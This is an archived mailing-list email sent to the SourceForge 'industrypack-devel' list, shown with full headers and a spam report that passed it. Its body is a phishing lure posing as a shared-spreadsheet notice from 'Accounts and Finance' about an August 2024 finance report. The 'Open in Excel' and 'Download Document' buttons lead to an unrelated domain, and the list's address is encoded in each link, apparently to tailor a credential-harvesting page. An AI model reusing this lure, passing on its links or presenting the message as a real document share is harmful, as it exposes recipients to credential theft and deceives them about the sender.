Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B04D394C287
	for <lists+industrypack-devel@lfdr.de>; Thu,  8 Aug 2024 18:21:09 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sc5sy-0007Gl-H6
	for lists+industrypack-devel@lfdr.de;
	Thu, 08 Aug 2024 16:21:08 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <president@flexittank.net>) id 1sc5sw-0007Gb-Jd
 for industrypack-devel@lists.sourceforge.net;
 Thu, 08 Aug 2024 16:21:06 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=rp18z9t3kuYsoe8351pVpl7qHCA0zswYRDz2dVmfZpE=; b=F6x4QodEX9XpjMHPFhaFS2bi4W
 Oy4RuCeOWc0Bw0yk2fudOvfurLkuvXAdCjTWZV+7UHv4/wt1jL2i5BIJ9uP0JMZJfw5BQ8g/IlJ+2
 fUYjCHfYGxEREoBPQajJ+YnJF96jCNkF1TybPJmLTH0zrFO32h3Tvvy+FbLLanO7AdcY=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=rp18z9t3kuYsoe8351pVpl7qHCA0zswYRDz2dVmfZpE=; b=Y
 VyFJv7HgWah9+0x3Saq3fl7dokOCare5RucqrILoLCtgZ0kR0MMqcVOXjPNzLHkxTQGrV+pCjT0wX
 z4adu4HFccWZTxK+eq81TJND9hfSZWrYI5HdKiZ2/KjjIFxermHAxP8//6GS5Ri/rmY2Y+2ma483l
 IZ6wEzk95sYUYaBI=;
Received: from flexittank.net ([45.145.42.85])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1sc5sv-0006EY-Je for industrypack-devel@lists.sourceforge.net;
 Thu, 08 Aug 2024 16:21:06 +0000
Received: from EC2AMAZ-HFMJDML (ec2-35-171-19-68.compute-1.amazonaws.com
 [35.171.19.68])
 by flexittank.net (Postfix) with ESMTPSA id 09D19AF56E
 for <industrypack-devel@lists.sourceforge.net>;
 Thu,  8 Aug 2024 18:20:53 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=flexittank.net;
 s=default; t=1723134054;
 bh=rp18z9t3kuYsoe8351pVpl7qHCA0zswYRDz2dVmfZpE=; h=From:Subject:To;
 b=AdBAiFfljgnZ5Pqz8kdbY75UDakHk9howduAHd63pmeyW1dFjvgj6yxfEYs2/F+CE
 iDIu9y6mfcmObE1if2h/L8TaRVw2chLHSBsI888rq3jRJLj19o6MIgm3U3P1aDWg9X
 E8Khk7ESS6kTE7nwoMGPnJMSN4p5r/zv+ujJP+YMDi3iyvlFutXY7yox1v0A0LX2gT
 QeJzEoEuNi6WArRc7/ztatk/PChOsHKef7/aaTImMBJPd2YCjDzXAfxr/QOu+HjFTi
 bSiTNtFhgKJRxmca9SstU7OsSYTsEgxeMKCtl9aJ9UyLfIUSNwaJ9g8ZbmPjKqasQv
 zNg6hJ+tVGxeg==
Authentication-Results: flexittank.net;
 spf=pass (sender IP is 35.171.19.68) smtp.mailfrom=president@flexittank.net
 smtp.helo=EC2AMAZ-HFMJDML
Received-SPF: pass (flexittank.net: connection is authenticated)
To: <industrypack-devel@lists.sourceforge.net>
MIME-Version: 1.0
Date: Thu, 8 Aug 2024 16:20:54 +0000
Message-Id: <08532024082016B4C80EE09E$DC982F403C@flexittank.net>
X-Spam-Score: -5.2 (-----)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Lists Accounts and Finance has shared access to "August
 Financial
 Meeting Report 2024.xlsx" With You industrypack-devel@lists.sourceforge.net
 . Content analysis details:   (-5.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: khobregankghaz.com]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [45.145.42.85 listed in list.dnswl.org]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
X-Headers-End: 1sc5sv-0006EY-Je
Subject: [Industrypack-devel] Your Lists August Finance Reconciliation Report
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Finance via Industrypack-devel <industrypack-devel@lists.sourceforge.net>
Reply-To: Finance <president@flexittank.net>
Content-Type: multipart/mixed; boundary="===============0421363540326429945=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format

--===============0421363540326429945==
Content-Type: multipart/alternative; boundary="zGgnYEEYCq1VkPIjDWt4lpw=_rCSdEYUoA"

This is a multi-part message in MIME format

--zGgnYEEYCq1VkPIjDWt4lpw=_rCSdEYUoA
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable


Lists Accounts and Finance has shared access to "August Financial Meet=
ing Report 2024.xlsx" With You

industrypack-devel@lists.sourceforge.net

=2E

Lists _payment Schedule August 2024.xlsx

Last modified Thursday, August 8, 2024=20

Open in Excel https://khobregankghaz.com/#aW5kdXN0cnlwYWNrLWRldmVsQGxp=
c3RzLnNvdXJjZWZvcmdlLm5ldA=3D=3D

Download Document https://khobregankghaz.com/#aW5kdXN0cnlwYWNrLWRldmVs=
QGxpc3RzLnNvdXJjZWZvcmdlLm5ldA=3D=3D

--zGgnYEEYCq1VkPIjDWt4lpw=_rCSdEYUoA
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: quoted-printable


<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
8">
  <title>Your Lists August Finance Reconciliation Report</title>
 </head>
 <body style=3D"FONT-SIZE: medium; FONT-FAMILY: 'Google Sans', Roboto,=
 RobotoDraft, Helvetica, Arial, sans-serif; WHITE-SPACE: normal; WORD-=
SPACING: 0px; POSITION: relative; TEXT-TRANSFORM: none; FONT-WEIGHT: 4=
00; COLOR: rgb(32,33,36); FONT-STYLE: normal; MIN-HEIGHT: 100%; ORPHAN=
S: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial; text-decoration-style: i=
nitial; text-decoration-color: initial" <div> <DIV class=3DnH style=3D=
"WIDTH: 1280px"> <DIV class=3DnH style=3D"POSITION: relative"> <DIV cl=
ass=3D"nH aqk aql bkL" style=3D"POSITION: relative; DISPLAY: flex; BAC=
KGROUND-COLOR: transparent; flex-direction: row; --gm3-sys-color-backg=
round: #fff; --gm3-sys-color-background-rgb: 255,255,255; --gm3-sys-co=
lor-error: #b3261e; --gm3-sys-color-error-rgb: 179,38,30; --gm3-sys-co=
lor-error-container: #f9dedc; --gm3-sys-color-error-container-rgb: 249=
,222,220; --gm3-sys-color-inverse-on-surface: #f2f2f2; --gm3-sys-color=
-inverse-on-surface-rgb: 242,242,242; --gm3-sys-color-inverse-primary:=
 #a8c7fa; --gm3-sys-color-inverse-primary-rgb: 168,199,250; --gm3-sys-=
color-inverse-surface: #303030; --gm3-sys-color-inverse-surface-rgb: 4=
8,48,48; --gm3-sys-color-on-background: #1f1f1f; --gm3-sys-color-on-ba=
ckground-rgb: 31,31,31; --gm3-sys-color-on-error: #fff; --gm3-sys-colo=
r-on-error-rgb: 255,255,255; --gm3-sys-color-on-error-container: #410e=
0b; --gm3-sys-color-on-error-container-rgb: 65,14,11; --gm3-sys-color-=
on-primary: #fff; --gm3-sys-color-on-primary-rgb: 255,255,255; --gm3-s=
ys-color-on-primary-container: #041e49; --gm3-sys-color-on-primary-con=
tainer-rgb: 4,30,73; --gm3-sys-color-on-primary-fixed: #041e49; --gm3-=
sys-color-on-primary-fixed-rgb: 4,30,73; --gm3-sys-color-on-primary-fi=
xed-variant: #0842a0; --gm3-sys-color-on-primary-fixed-variant-rgb: 8,=
66,160; --gm3-sys-color-on-secondary: #fff; --gm3-sys-color-on-seconda=
ry-rgb: 255,255,255; --gm3-sys-color-on-secondary-container: #001d35; =
--gm3-sys-color-on-secondary-container-rgb: 0,29,53; --gm3-sys-color-o=
n-secondary-fixed: #001d35; --gm3-sys-color-on-secondary-fixed-rgb: 0,=
29,53; --gm3-sys-color-on-secondary-fixed-variant: #004a77; --gm3-sys-=
color-on-secondary-fixed-variant-rgb: 0,74,119; --gm3-sys-color-on-sur=
face: #1f1f1f; --gm3-sys-color-on-surface-rgb: 31,31,31; --gm3-sys-col=
or-on-surface-variant: #444746; --gm3-sys-color-on-surface-variant-rgb=
: 68,71,70; --gm3-sys-color-on-tertiary: #fff; --gm3-sys-color-on-tert=
iary-rgb: 255,255,255; --gm3-sys-color-on-tertiary-container: #072711;=
 --gm3-sys-color-on-tertiary-container-rgb: 7,39,17; --gm3-sys-color-o=
n-tertiary-fixed: #072711; --gm3-sys-color-on-tertiary-fixed-rgb: 7,39=
,17; --gm3-sys-color-on-tertiary-fixed-variant: #0f5223; --gm3-sys-col=
or-on-tertiary-fixed-variant-rgb: 15,82,35; --gm3-sys-color-outline: #=
747775; --gm3-sys-color-outline-rgb: 116,119,117; --gm3-sys-color-outl=
ine-variant: #c4c7c5; --gm3-sys-color-outline-variant-rgb: 196,199,197=
; --gm3-sys-color-primary: #0b57d0; --gm3-sys-color-primary-rgb: 11,87=
,208; --gm3-sys-color-primary-container: #d3e3fd; --gm3-sys-color-prim=
ary-container-rgb: 211,227,253; --gm3-sys-color-primary-fixed: #d3e3fd=
; --gm3-sys-color-primary-fixed-rgb: 211,227,253; --gm3-sys-color-prim=
ary-fixed-dim: #a8c7fa; --gm3-sys-color-primary-fixed-dim-rgb: 168,199=
,250; --gm3-sys-color-scrim: #000; --gm3-sys-color-scrim-rgb: 0,0,0; -=
-gm3-sys-color-secondary: #00639b; --gm3-sys-color-secondary-rgb: 0,99=
,155; --gm3-sys-color-secondary-container: #c2e7ff; --gm3-sys-color-se=
condary-container-rgb: 194,231,255; --gm3-sys-color-secondary-fixed: #=
c2e7ff; --gm3-sys-color-secondary-fixed-rgb: 194,231,255; --gm3-sys-co=
lor-secondary-fixed-dim: #7fcfff; --gm3-sys-color-secondary-fixed-dim-=
rgb: 127,207,255; --gm3-sys-color-shadow: #000; --gm3-sys-color-shadow=
-rgb: 0,0,0; --gm3-sys-color-surface: #fff; --gm3-sys-color-surface-rg=
b: 255,255,255; --gm3-sys-color-surface-bright: #fff; --gm3-sys-color-=
surface-bright-rgb: 255,255,255; --gm3-sys-color-surface-container: #f=
0f4f9; --gm3-sys-color-surface-container-rgb: 240,244,249; --gm3-sys-c=
olor-surface-container-high: #e9eef6; --gm3-sys-color-surface-containe=
r-high-rgb: 233,238,246; --gm3-sys-color-surface-container-highest: #d=
de3ea; --gm3-sys-color-surface-container-highest-rgb: 221,227,234; --g=
m3-sys-color-surface-container-low: #f8fafd; --gm3-sys-color-surface-c=
ontainer-low-rgb: 248,250,253; --gm3-sys-color-surface-container-lowes=
t: #fff; --gm3-sys-color-surface-container-lowest-rgb: 255,255,255; --=
gm3-sys-color-surface-dim: #d3dbe5; --gm3-sys-color-surface-dim-rgb: 2=
11,219,229; --gm3-sys-color-surface-tint: #6991d6; --gm3-sys-color-sur=
face-tint-rgb: 105,145,214; --gm3-sys-color-surface-variant: #e1e3e1; =
--gm3-sys-color-surface-variant-rgb: 225,227,225; --gm3-sys-color-tert=
iary: #146c2e; --gm3-sys-color-tertiary-rgb: 20,108,46; --gm3-sys-colo=
r-tertiary-container: #c4eed0; --gm3-sys-color-tertiary-container-rgb:=
 196,238,208; --gm3-sys-color-tertiary-fixed: #c4eed0; --gm3-sys-color=
-tertiary-fixed-rgb: 196,238,208; --gm3-sys-color-tertiary-fixed-dim: =
#6dd58c; --gm3-sys-color-tertiary-fixed-dim-rgb: 109,213,140"> <DIV cl=
ass=3D"nH bkK" style=3D"OVERFLOW: hidden; -webkit-box-flex: 1; flex-gr=
ow: 1"> <DIV class=3DnH style=3D"MARGIN-BOTTOM: 16px; OVERFLOW-Y: hidd=
en; BACKGROUND-COLOR: rgb(255,255,255); border-radius: 16px"> <DIV cla=
ss=3D"nH ar4 B"> <DIV> <DIV class=3DAO style=3D"POSITION: relative"> <=
DIV id=3D:3 class=3D"Tm aeJ" style=3D"HEIGHT: 545px; BACKGROUND: white=
; OVERFLOW-Y: scroll; PADDING-RIGHT: 0px"> <DIV id=3D:1 class=3DaeF st=
yle=3D"VERTICAL-ALIGN: bottom; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; MIN-HEIGHT: 355px; PADDING-RIGHT: 0px"> <DIV class=3D=
nH> <DIV role=3Dmain class=3DnH> <DIV class=3D"nH g"> <DIV class=3D"nH=
 a98 iY" style=3D"BACKGROUND: rgb(255,255,255); MIN-WIDTH: 502px; POSI=
TION: static !important; MIN-HEIGHT: 64ex; MARGIN: 0px; PADDING-RIGHT:=
 16px"> <DIV class=3DnH> <DIV class=3D"aHU hx" style=3D"MIN-WIDTH: 502=
px; POSITION: relative; COLOR: rgb(34,34,34); PADDING-BOTTOM: 0px; PAD=
DING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR=
: transparent"> <DIV role=3Dlist> <DIV aria-expanded=3Dtrue role=3Dlis=
titem tabIndex=3D-1 class=3D"h7 ie" style=3D"MAX-WIDTH: 100000px; OUTL=
INE-WIDTH: medium; PADDING-BOTTOM: 0px; OUTLINE-STYLE: none; CLEAR: bo=
th; OUTLINE-COLOR: invert"> <DIV class=3DBk style=3D"BORDER-LEFT-WIDTH=
: 0px; MARGIN-BOTTOM: 0px; BORDER-TOP: rgb(239,239,239) 0px solid; BOR=
DER-RIGHT-WIDTH: 0px; WIDTH: 868px; BORDER-BOTTOM-WIDTH: 0px; POSITION=
: relative; FLOAT: left; BORDER-LEFT-COLOR: ; BORDER-BOTTOM-COLOR: ; B=
ORDER-RIGHT-COLOR: ; border-radius: 0px; border-image: initial"> <DIV =
class=3D"G3 G2" style=3D"MARGIN-BOTTOM: 0px; BORDER-TOP: medium none; =
BORDER-RIGHT: 0px; BORDER-BOTTOM-WIDTH: 0px; PADDING-TOP: 0px; MARGIN-=
LEFT: 0px; BORDER-LEFT: 0px; BACKGROUND-COLOR: transparent; MARGIN-RIG=
HT: 0px; border-radius: 0px; border-image: initial"> <DIV> <DIV id=3D:=
2ie> <DIV class=3D"adn ads" style=3D"PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; BORDER-LEFT: medium none; DISPLAY: flex; PADD=
ING-RIGHT: 0px" data-legacy-message-id=3D"191233b319576319" data-messa=
ge-id=3D"#msg-f:1806563244846310169"> <DIV class=3Dgs style=3D"MIN-WID=
TH: 0px; PADDING-BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MA=
RGIN: 0px; PADDING-RIGHT: 0px"> <DIV> <DIV id=3D:2i7 class=3D"ii gt" s=
tyle=3D"OVERFLOW-X: hidden; POSITION: relative; PADDING-BOTTOM: 0px; D=
IRECTION: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 8px 0px 0p=
x; PADDING-RIGHT: 0px"> <DIV id=3D:2hf class=3D"a3s aiL " style=3D"POS=
ITION: relative; FONT: small/1.5 Arial, Helvetica, sans-serif"> <DIV><=
table style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: i=
nherit; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: colla=
pse; TEXT-TRANSFORM: none; FLOAT: left; FONT-WEIGHT: 400; COLOR: rgb(4=
4,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; LETTER-SPACING: normal=
; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; =
font-variant-caps: normal; text-decoration-style: initial; text-decora=
tion-color: initial; font-stretch: inherit" cellSpacing=3D0 cellPaddin=
g=3D0 width=3D600 border=3D0><tbody style=3D"BOX-SIZING: border-box"> =
<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px"> <TD style=3D"BOX=
-SIZING: border-box; FONT-SIZE: 17px; FONT-FAMILY: 'Segoe UI Semilight=
', 'Segoe UI', Tahoma, Arial, sans-serif; WHITE-SPACE: normal !importa=
nt; FONT-WEIGHT: normal; COLOR: rgb(0,0,0); PADDING-TOP: 20px; PADDING=
-LEFT: 12px; MARGIN: 0px; PADDING-RIGHT: 12px">Lists Accounts and Fina=
nce has shared access to "August Financial Meeting Report&nbsp; 2024.x=
lsx" With You<SPAN style=3D"VERTICAL-ALIGN: inherit"><A style=3D"COLOR=
: rgb(34,34,34)"> industrypack-devel@lists.sourceforge.net</A></SPAN>.=
</TD></TR></TABLE><table style=3D"BOX-SIZING: border-box; FONT-SIZE: 1=
4px; FONT-FAMILY: inherit; WHITE-SPACE: normal; WORD-SPACING: 0px; BOR=
DER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FLOAT: left; FONT-WEIGHT=
: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-=
ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
nitial; text-decoration-color: initial; font-stretch: inherit" cellSpa=
cing=3D0 cellPadding=3D0 width=3D"100%" border=3D0><tbody style=3D"BOX=
-SIZING: border-box"> <TR style=3D"BOX-SIZING: border-box; FONT-SIZE: =
0px"> <TD style=3D"BOX-SIZING: border-box; WHITE-SPACE: normal !import=
ant; PADDING-TOP: 10px; PADDING-LEFT: 12px; MARGIN: 0px">&nbsp;</td><t=
d style=3D"BOX-SIZING: border-box; WHITE-SPACE: normal !important; BOR=
DER-BOTTOM: rgb(153,153,153) 1px solid; MARGIN: 0px" width=3D"100%"><B=
R></td><td style=3D"BOX-SIZING: border-box; WHITE-SPACE: normal !impor=
tant; MARGIN: 0px; PADDING-RIGHT: 12px">&nbsp;</TD></TR></TABLE><table=
 style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: inheri=
t; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; =
TEXT-TRANSFORM: none; FLOAT: left; FONT-WEIGHT: 400; COLOR: rgb(44,54,=
58); FONT-STYLE: normal; TEXT-ALIGN: left; LETTER-SPACING: normal; BAC=
KGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; font-=
variant-caps: normal; text-decoration-style: initial; text-decoration-=
color: initial; font-stretch: inherit" cellSpacing=3D0 cellPadding=3D0=
 width=3D600 border=3D0><tbody style=3D"BOX-SIZING: border-box"> <TR s=
tyle=3D"BOX-SIZING: border-box; FONT-SIZE: 0px"> <TD style=3D"BOX-SIZI=
NG: border-box; WHITE-SPACE: normal !important; TEXT-ALIGN: left; PADD=
ING-LEFT: 12px; MARGIN: 0px; PADDING-RIGHT: 6px; BACKGROUND-COLOR: rgb=
(255,255,255)" vAlign=3Dmiddle width=3D50><BR></td><td style=3D"BOX-SI=
ZING: border-box; WHITE-SPACE: normal !important; PADDING-BOTTOM: 20px=
; PADDING-TOP: 20px; MARGIN: 0px; PADDING-RIGHT: 12px; BACKGROUND-COLO=
R: rgb(255,255,255)" width=3D"100%"><table style=3D"BOX-SIZING: border=
-box; FONT-FAMILY: inherit; BORDER-COLLAPSE: collapse; FLOAT: left; fo=
nt-stretch: inherit" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bo=
rder=3D0><tbody style=3D"BOX-SIZING: border-box"> <TR style=3D"BOX-SIZ=
ING: border-box; FONT-SIZE: 0px"> <TD style=3D"BOX-SIZING: border-box;=
 FONT-SIZE: 21px; FONT-FAMILY: 'Segoe UI Light', 'Segoe UI', Tahoma, A=
rial, sans-serif; WHITE-SPACE: normal !important; FONT-WEIGHT: normal;=
 COLOR: rgb(51,51,51); MARGIN: 0px">&nbsp; Lists _payment Schedule&nbs=
p;August 2024.xlsx</TD></TR> <TR style=3D"BOX-SIZING: border-box; FONT=
-SIZE: 0px"> <TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FON=
T-FAMILY: 'Segoe UI', Tahoma, Arial, sans-serif; WHITE-SPACE: normal !=
important; FONT-WEIGHT: normal; COLOR: rgb(118,118,118); MARGIN: 0px">=
Last modified <SPAN class=3Dil><SPAN style=3D"VERTICAL-ALIGN: inherit"=
>Thursday, August 8, 2024 </SPAN></SPAN></TD></TR></TABLE></TD></TR> <=
TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px"> <TD style=3D"BOX-=
SIZING: border-box; WHITE-SPACE: normal !important; PADDING-BOTTOM: 40=
px; PADDING-LEFT: 12px; MARGIN: 0px; PADDING-RIGHT: 12px; BACKGROUND-C=
OLOR: rgb(255,255,255)" colSpan=3D2><table style=3D"BOX-SIZING: border=
-box; FONT-FAMILY: inherit; BORDER-COLLAPSE: collapse; FLOAT: left; TE=
XT-ALIGN: left; font-stretch: inherit" cellSpacing=3D0 cellPadding=3D0=
 border=3D0><tbody style=3D"BOX-SIZING: border-box"> <TR style=3D"BOX-=
SIZING: border-box; FONT-SIZE: 0px"> <TD style=3D"BOX-SIZING: border-b=
ox; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe UI', Tahoma, Arial, sans-seri=
f; WHITE-SPACE: normal !important; FONT-WEIGHT: normal; COLOR: rgb(255=
,255,255); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-LEFT: 12px=
; MARGIN: 0px; PADDING-RIGHT: 12px; BACKGROUND-COLOR: rgb(33,115,70)">=
<A style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; TEXT-DECOR=
ATION: none; FONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-A=
LIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(255,255,255); PAD=
DING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PA=
DDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: transparent=
; font-stretch: inherit" href=3D"https://khobregankghaz.com/#aW5kdXN0c=
nlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdlLm5ldA=3D=3D" rel=3Dnoreferrer =
target=3D_blank data-saferedirecturl=3D"https://khobregankghaz.com/#aW=
5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdlLm5ldA=3D=3D&amp;source=3D=
gmail&amp;ust=3D1722959776022000&amp;usg=3DAOvVaw2pmnaOQ8UuVpesOdTQNL8=
o">Open in Excel</A></td><td style=3D"BOX-SIZING: border-box; FONT-SIZ=
E: 20px; WHITE-SPACE: normal !important; MARGIN: 0px">&nbsp;&nbsp;&nbs=
p;</td><td style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMI=
LY: 'Segoe UI', Tahoma, Arial, sans-serif; WHITE-SPACE: normal !import=
ant; FONT-WEIGHT: normal; COLOR: rgb(51,51,51); PADDING-BOTTOM: 12px; =
PADDING-TOP: 12px; PADDING-LEFT: 12px; MARGIN: 0px; PADDING-RIGHT: 12p=
x; BACKGROUND-COLOR: rgb(244,244,244)"><A style=3D"BORDER-LEFT-WIDTH: =
0px; BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMILY: inher=
it; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-W=
IDTH: 0px; COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; PADDING-TOP: 0px=
; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH=
: 0px; BACKGROUND-COLOR: transparent; font-stretch: inherit" href=3D"h=
ttps://khobregankghaz.com/#aW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZ=
vcmdlLm5ldA=3D=3D" rel=3Dnoreferrer target=3D_blank data-saferedirectu=
rl=3D"https://khobregankghaz.com/#aW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNv=
dXJjZWZvcmdlLm5ldA=3D=3D&amp;source=3Dgmail&amp;ust=3D1722959776022000=
&amp;usg=3DAOvVaw1VGa58IHN0uWsXYTReSoUd">Download Document</A></TD></T=
R></TABLE></TD></TR></TABLE></DIV></DIV></DIV></DIV></DIV></DIV></DIV>=
</DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DI=
V> <DIV role=3Dtab aria-label=3D"Get Add-ons" aria-selected=3Dfalse id=
=3DqJTzr class=3D"bse-bvF-I aT5-aOt-I" style=3D"CURSOR: pointer; HEIGH=
T: 56px; WIDTH: 56px; POSITION: relative; OUTLINE-WIDTH: medium; OUTLI=
NE-STYLE: none; OUTLINE-COLOR: invert; pointer-events: none; transitio=
n: 0.3s cubic-bezier(0.4, 0, 0.2, 1); user-select: none"></DIV></DIV><=
/DIV></DIV> <DIV class=3DbrC-dA-I-Jw style=3D"OVERFLOW: hidden; HEIGHT=
: 56px; WIDTH: 56px; RIGHT: 0px; POSITION: absolute; Z-INDEX: 2; DISPL=
AY: flex; BOTTOM: 0px; pointer-events: none"> <DIV role=3Dbutton tabIn=
dex=3D0 aria-label=3D"Hide side panel" aria-pressed=3Dfalse class=3D"a=
T5-aOt-I brC-dA-I" style=3D"CURSOR: pointer; HEIGHT: 56px; WIDTH: 56px=
; POSITION: relative; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTL=
INE-COLOR: invert; BOTTOM: 0px; pointer-events: none; transition: 0.3s=
 cubic-bezier(0.4, 0, 0.2, 1); user-select: none"> <DIV class=3DaT5-aO=
t-I-JX-atM style=3D"HEIGHT: 40px; WIDTH: 40px; POSITION: absolute; LEF=
T: 8px; DISPLAY: flex; TOP: 8px; border-radius: calc(58px); transition=
: 0.3s cubic-bezier(0.4, 0, 0.2, 1)"></DIV> <DIV class=3DaT5-aOt-I-JX-=
Jw style=3D"HEIGHT: 40px; WIDTH: 40px; BACKGROUND-REPEAT: no-repeat; P=
OSITION: absolute; BACKGROUND-POSITION: center center; LEFT: 8px; DISP=
LAY: flex; TOP: 8px; BACKGROUND-COLOR: transparent; border-radius: cal=
c(58px); pointer-events: auto; transition: 0.3s cubic-bezier(0.4, 0, 0=
=2E2, 1); background-size: 20px 20px; -webkit-box-align: center; align=
-items: center"><SVG id=3DLayer_1 class=3DaT5-aOt-I-JX fill=3D"#5F6368=
" xml:space=3D"preserve" viewBox=3D"0 0 24 24" height=3D"20px" width=3D=
"20px" y=3D"0px" x=3D"0px"><PATH d=3D"M8.59,16.59L13.17,12L8.59,7.41L1=
0,6l6,6l-6,6L8.59,16.59z"></PATH><PATH fill=3D"none" d=3D"M0,0h24v24H0=
V0z"></PATH></SVG></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DI=
